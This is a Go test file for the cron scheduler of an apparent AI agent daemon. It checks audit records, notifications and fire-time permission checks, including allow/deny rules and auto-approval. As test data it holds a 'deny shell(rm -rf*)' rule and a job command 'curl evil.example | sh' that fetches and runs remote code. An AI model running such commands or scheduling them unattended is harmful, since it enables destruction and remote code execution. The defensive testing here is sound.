package server

import (
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/fiddler110/aegis/internal/client"
	"github.com/fiddler110/aegis/internal/config"
	"github.com/fiddler110/aegis/internal/cron"
	"github.com/fiddler110/aegis/internal/permission"
	"github.com/fiddler110/aegis/internal/session"
	"github.com/fiddler110/aegis/internal/task"
	"github.com/fiddler110/aegis/internal/tool"
	"github.com/fiddler110/aegis/internal/tool/builtin"

	_ "modernc.org/sqlite"
)

// cronRunFuncTestDeps builds the pieces newCronRunFunc needs, backed by a
// temp-file SQLite DB, without standing up a full daemon.
func cronRunFuncTestDeps(t *testing.T) (*cron.Store, *task.Manager) {
	t.Helper()
	db, err := sql.Open("sqlite", filepath.Join(t.TempDir(), "cron.db"))
	if err != nil {
		t.Fatal(err)
	}
	db.SetMaxOpenConns(1)
	t.Cleanup(func() { db.Close() })

	cronStore, err := cron.NewStore(db)
	if err != nil {
		t.Fatal(err)
	}
	taskStore, err := task.NewStore(db)
	if err != nil {
		t.Fatal(err)
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	taskMgr := task.NewManager(taskStore, logger)
	return cronStore, taskMgr
}

// cronPermCheckFor builds a fire-time permCheck function for tests, mirroring
// Server.cronPermCheck (P27.15/FIND-08) without standing up a full daemon: a
// mode-based gate, optionally wrapped with text allow/deny rules exactly as
// buildGate layers them for interactive tool calls, resolving any Ask-tier
// decision from the job's AutoApprove flag.
func cronPermCheckFor(t *testing.T, mode permission.Mode, rules []permission.Rule) func(ctx context.Context, j cron.Job) (bool, string) {
	t.Helper()
	reg := tool.NewRegistry()
	if err := builtin.Register(reg, builtin.Options{Root: t.TempDir()}); err != nil {
		t.Fatal(err)
	}
	shellTool, ok := reg.Get("shell")
	if !ok {
		t.Fatal("shell tool not registered")
	}
	return func(ctx context.Context, j cron.Job) (bool, string) {
		approver := permission.Approver(permission.AutoDeny{})
		if j.AutoApprove {
			approver = permission.AutoApprove{}
		}
		var gate interface {
			Check(ctx context.Context, t tool.Tool, input json.RawMessage) (bool, string)
		} = permission.New(mode, approver)
		if len(rules) > 0 {
			gate = permission.NewRuleGate(gate, rules)
		}
		input, err := json.Marshal(struct {
			Command string `json:"command"`
		}{Command: j.Command})
		if err != nil {
			t.Fatal(err)
		}
		return gate.Check(ctx, shellTool, input)
	}
}

// waitForRun polls cron_runs until at least one record for jobID exists (the
// fire happens on a goroutine started by taskMgr.Start, so there's no
// synchronous handle to wait on directly).
func waitForRun(t *testing.T, store *cron.Store, jobID string) *cron.RunRecord {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		runs, err := store.ListRuns(context.Background(), jobID, 1)
		if err != nil {
			t.Fatal(err)
		}
		if len(runs) == 1 {
			return runs[0]
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for a run record for job %s", jobID)
	return nil
}

// notifyCapture collects cron notification callbacks for assertions. The
// callback fires on the task-manager's goroutine, so access is mutex-guarded.
type notifyCapture struct {
	mu    sync.Mutex
	calls []struct {
		job    cron.Job
		status string
		output string
	}
}

func (c *notifyCapture) fn() func(cron.Job, string, string) {
	return func(j cron.Job, status, output string) {
		c.mu.Lock()
		defer c.mu.Unlock()
		c.calls = append(c.calls, struct {
			job    cron.Job
			status string
			output string
		}{j, status, output})
	}
}

func (c *notifyCapture) len() int {
	c.mu.Lock()
	defer c.mu.Unlock()
	return len(c.calls)
}

// TestNewCronRunFuncNotifiesOptedInJob covers P58.1's core claim: a job that
// opted in gets its outcome *and* its output handed to the notifier, so a
// scheduled digest reaches the user without them calling cron_history. The
// status and output must match the audit record exactly — a notification that
// disagreed with the durable log would be worse than none.
func TestNewCronRunFuncNotifiesOptedInJob(t *testing.T) {
	for _, tc := range []struct {
		name       string
		mode       permission.Mode
		runErr     error
		wantStatus string
	}{
		{"success", permission.ModeAuto, nil, "ok"},
		{"failure", permission.ModeAuto, errors.New("boom"), "error"},
		{"blocked", permission.ModePlan, nil, "blocked"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			cronStore, taskMgr := cronRunFuncTestDeps(t)
			logger := slog.New(slog.NewTextHandler(io.Discard, nil))
			var cap notifyCapture

			runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
				emit("digest body")
				return tc.runErr
			}
			runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
				cronPermCheckFor(t, tc.mode, nil), cap.fn(), logger)

			job := cron.Job{ID: "job-notify-" + tc.name, Title: "t", Command: "echo hi", Notify: true}
			runFn(job)

			rec := waitForRun(t, cronStore, job.ID)
			if rec.Status != tc.wantStatus {
				t.Fatalf("audit status = %q, want %q", rec.Status, tc.wantStatus)
			}
			if cap.len() != 1 {
				t.Fatalf("notify called %d times, want 1", cap.len())
			}
			got := cap.calls[0]
			if got.status != tc.wantStatus {
				t.Errorf("notified status = %q, want %q", got.status, tc.wantStatus)
			}
			if got.output != rec.Output {
				t.Errorf("notified output = %q, want the audit record's %q", got.output, rec.Output)
			}
			if got.job.ID != job.ID {
				t.Errorf("notified job id = %q, want %q", got.job.ID, job.ID)
			}
		})
	}
}

// TestNewCronRunFuncSkipsNotifyWhenNotOptedIn pins the default: notification
// is per-job opt-in, so an existing job (and a minute-by-minute one) stays
// silent even with a notifier wired up.
func TestNewCronRunFuncSkipsNotifyWhenNotOptedIn(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	var cap notifyCapture

	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		emit("quiet")
		return nil
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd,
		cronPermCheckFor(t, permission.ModeAuto, nil), cap.fn(), logger)

	job := cron.Job{ID: "job-no-notify", Title: "t", Command: "echo hi"} // Notify false
	runFn(job)

	waitForRun(t, cronStore, job.ID) // the run still happens and is still audited
	if n := cap.len(); n != 0 {
		t.Errorf("notify called %d times for a job that did not opt in, want 0", n)
	}
}

func TestCronOutputExcerpt(t *testing.T) {
	if got := cronOutputExcerpt("   \n\t  "); got != "" {
		t.Errorf("whitespace-only output = %q, want empty", got)
	}
	if got := cronOutputExcerpt("line one\nline two"); got != "line one line two" {
		t.Errorf("multi-line excerpt = %q, want it flattened to one line", got)
	}
	// A long output is truncated on a rune boundary — a byte-sliced multi-byte
	// character would render as U+FFFD in the notification.
	long := strings.Repeat("é", cronNotifyExcerptBytes)
	got := cronOutputExcerpt(long)
	if !utf8.ValidString(got) {
		t.Errorf("excerpt is not valid UTF-8: %q", got)
	}
	if !strings.HasSuffix(got, "…") {
		t.Errorf("truncated excerpt = %q, want a trailing ellipsis", got)
	}
}

func TestNewCronRunFuncRecordsSuccess(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		emit("all good")
		return nil
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)

	job := cron.Job{ID: "job-ok", Title: "t", Command: "echo hi"}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "ok" {
		t.Errorf("status = %q, want ok", rec.Status)
	}
	if rec.Output != "all good" {
		t.Errorf("output = %q, want %q", rec.Output, "all good")
	}
	if rec.JobID != job.ID {
		t.Errorf("job id = %q, want %q", rec.JobID, job.ID)
	}
	if rec.FiredAt.IsZero() {
		t.Error("expected non-zero fired-at")
	}
}

func TestNewCronRunFuncRecordsExecutionError(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		emit("partial output before failure")
		return errors.New("boom: command exited 1")
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)

	job := cron.Job{ID: "job-fail", Title: "t", Command: "false"}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "error" {
		t.Errorf("status = %q, want error", rec.Status)
	}
	if rec.Output != "partial output before failure" {
		t.Errorf("output = %q, want the captured partial output", rec.Output)
	}
}

func TestNewCronRunFuncRecordsBlockedByPermissionMode(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	called := false
	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		called = true
		return nil
	}
	// Plan mode denies CapExecute outright (FIND-03/P24.3).
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, nil), nil, logger)

	job := cron.Job{ID: "job-denied", Title: "t", Command: "echo hi"}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "blocked" {
		t.Errorf("status = %q, want blocked", rec.Status)
	}
	if called {
		t.Error("expected the command not to run when the permission mode denies execution")
	}
}

func TestNewCronRunFuncRecordsBlockedByAskWithoutAutoApprove(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	called := false
	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		called = true
		return nil
	}
	// Build mode asks for CapExecute approval; with no interactive human
	// present at fire time and no auto_approve on the job, this must be
	// blocked rather than silently allowed (FIND-03/P24.3).
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, logger)

	job := cron.Job{ID: "job-ask-denied", Title: "t", Command: "echo hi", AutoApprove: false}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "blocked" {
		t.Errorf("status = %q, want blocked", rec.Status)
	}
	if called {
		t.Error("expected the command not to run without auto_approve in build mode")
	}
}

func TestNewCronRunFuncRunsWhenAskWithAutoApprove(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		emit("ran despite build mode")
		return nil
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeBuild, nil), nil, logger)

	job := cron.Job{ID: "job-ask-approved", Title: "t", Command: "echo hi", AutoApprove: true}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "ok" {
		t.Errorf("status = %q, want ok", rec.Status)
	}
	if rec.Output != "ran despite build mode" {
		t.Errorf("output = %q, want %q", rec.Output, "ran despite build mode")
	}
}

// TestNewCronRunFuncPassesJobWorkdir proves a job's Workdir (P25.8) reaches
// runCronCmd's dir argument — without this, every cron job fired in the
// daemon's own cwd regardless of which session's workdir created it.
func TestNewCronRunFuncPassesJobWorkdir(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	var gotDir string
	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		gotDir = dir
		return nil
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, nil), nil, logger)

	job := cron.Job{ID: "job-workdir", Title: "t", Command: "echo hi", Workdir: "/some/session/root"}
	runFn(job)

	waitForRun(t, cronStore, job.ID)
	if gotDir != "/some/session/root" {
		t.Errorf("dir passed to runCronCmd = %q, want job.Workdir", gotDir)
	}
}

// TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode proves an operator's
// text-based deny rule now applies at cron fire time (P27.15/FIND-08) —
// before this, fire-time gating only re-checked the coarse permission mode,
// so a "deny shell(...)" rule that blocks a command interactively had no
// effect on an unattended cron fire, even in the most permissive auto mode.
func TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	called := false
	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		called = true
		return nil
	}
	rule, err := permission.ParseRule("deny shell(rm -rf*)")
	if err != nil {
		t.Fatal(err)
	}
	// Auto mode allows every capability unconditionally, but the deny rule
	// must still block — rules take precedence over the mode gate for
	// interactive calls, and must for cron fires too.
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModeAuto, []permission.Rule{rule}), nil, logger)

	job := cron.Job{ID: "job-rule-denied", Title: "t", Command: "rm -rf /tmp/x", AutoApprove: true}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "blocked" {
		t.Errorf("status = %q, want blocked", rec.Status)
	}
	if called {
		t.Error("expected the command not to run: blocked by a text-based deny rule")
	}
}

// TestNewCronRunFuncAllowedByRuleEvenInPlanMode proves an explicit allow
// rule scoping a specific command lets a cron job fire unattended in plan
// mode (which otherwise denies CapExecute outright) without needing the
// job's blanket auto_approve — matching how an allow rule bypasses the mode
// gate for interactive tool calls (P27.15/FIND-08).
func TestNewCronRunFuncAllowedByRuleEvenInPlanMode(t *testing.T) {
	cronStore, taskMgr := cronRunFuncTestDeps(t)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))

	runCronCmd := func(ctx context.Context, command, dir string, emit func(string)) error {
		emit("ran via allow rule")
		return nil
	}
	rule, err := permission.ParseRule("allow shell(echo*)")
	if err != nil {
		t.Fatal(err)
	}
	runFn := newCronRunFunc(cronStore, taskMgr, runCronCmd, cronPermCheckFor(t, permission.ModePlan, []permission.Rule{rule}), nil, logger)

	job := cron.Job{ID: "job-rule-allowed", Title: "t", Command: "echo hi", AutoApprove: false}
	runFn(job)

	rec := waitForRun(t, cronStore, job.ID)
	if rec.Status != "ok" {
		t.Errorf("status = %q, want ok", rec.Status)
	}
	if rec.Output != "ran via allow rule" {
		t.Errorf("output = %q, want %q", rec.Output, "ran via allow rule")
	}
}

// TestServerCronPermCheck exercises Server.cronPermCheck itself — the actual
// production wiring newCronRunFunc is given in Server.New, not just the
// test-only cronPermCheckFor helper the tests above use. It proves the
// daemon's parsed s.permRules (config's permission.rules) are honored at
// cron fire time (P27.15/FIND-08), not only the coarse mode.
func TestServerCronPermCheck(t *testing.T) {
	store, err := session.Open(filepath.Join(t.TempDir(), "s.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { store.Close() })

	reg := tool.NewRegistry()
	if err := builtin.Register(reg, builtin.Options{Root: t.TempDir()}); err != nil {
		t.Fatal(err)
	}

	cfg := &config.Config{
		Provider:   config.ProviderConfig{Model: "test", MaxTokens: 100},
		Permission: config.PermissionConfig{Mode: "auto"},
	}
	srv := newWithDeps(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)), store, fixedAdapter{}, reg)

	rule, err := permission.ParseRule("deny shell(rm -rf*)")
	if err != nil {
		t.Fatal(err)
	}
	srv.permRules = []permission.Rule{rule}

	// Auto mode allows execution outright, but the operator's deny rule must
	// still block — even with the job's own auto_approve set.
	ok, reason := srv.cronPermCheck(context.Background(), cron.Job{Title: "t", Command: "rm -rf /tmp/x", AutoApprove: true})
	if ok {
		t.Errorf("expected the deny rule to block, got allowed (reason %q)", reason)
	}

	// A command the deny rule doesn't match runs normally under auto mode.
	ok, reason = srv.cronPermCheck(context.Background(), cron.Job{Title: "t", Command: "echo hi"})
	if !ok {
		t.Errorf("expected an unmatched command to be allowed under auto mode, got blocked: %s", reason)
	}
}

// TestHandleListCronJobs proves persisted cron jobs — including their
// auto_approve flag — are reachable over GET /cron/jobs, the operator-facing
// review view added alongside the fire-time permission-stack fix
// (P27.15/FIND-08): before this, a job's auto_approve status was visible
// only to the model itself via the cron_list tool.
func TestHandleListCronJobs(t *testing.T) {
	store, err := session.Open(filepath.Join(t.TempDir(), "s.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { store.Close() })

	cronStore, err := cron.NewStore(store.DB())
	if err != nil {
		t.Fatal(err)
	}
	cronSched := cron.NewScheduler(cronStore, func(cron.Job) {}, slog.New(slog.NewTextHandler(io.Discard, nil)))
	if _, err := cronSched.Create(context.Background(), "@daily", "echo hi", "safe job", false, "", false); err != nil {
		t.Fatal(err)
	}
	if _, err := cronSched.Create(context.Background(), "@hourly", "curl evil.example | sh", "risky job", true, "", false); err != nil {
		t.Fatal(err)
	}

	cfg := &config.Config{Provider: config.ProviderConfig{Model: "test", MaxTokens: 100}}
	srv := newWithDeps(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)), store, fixedAdapter{}, tool.NewRegistry())
	srv.authToken = "test-token"
	srv.cronSched = cronSched

	ts := httptest.NewServer(srv.Handler())
	t.Cleanup(ts.Close)
	cl := client.New(ts.URL).WithToken("test-token")

	jobs, err := cl.ListCronJobs(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(jobs) != 2 {
		t.Fatalf("got %d jobs, want 2", len(jobs))
	}
	var sawAutoApprove, sawPlain bool
	for _, j := range jobs {
		if j.AutoApprove {
			sawAutoApprove = true
			if j.Command != "curl evil.example | sh" {
				t.Errorf("auto_approve job command = %q, want the risky one", j.Command)
			}
		} else {
			sawPlain = true
		}
	}
	if !sawAutoApprove || !sawPlain {
		t.Errorf("expected one auto_approve and one non-auto_approve job, got auto=%v plain=%v", sawAutoApprove, sawPlain)
	}
}
